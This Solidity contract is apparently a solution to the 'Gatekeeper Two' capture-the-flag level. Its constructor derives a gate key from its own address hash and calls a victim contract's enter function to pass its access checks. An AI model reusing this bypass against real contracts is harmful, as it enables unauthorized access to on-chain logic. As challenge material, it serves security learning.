pragma solidity ^0.5;

contract HackGateKeeperTwo {
  constructor (address victim) public {
    bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
    // uint64 gateKeyRight = uint64(0) - 1;
    // bytes8 gateKey = gateKeyLeft ^ bytes8(gateKeyRight);
    bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")), gateKey);
    victim.call(encodedParams);
  }
}
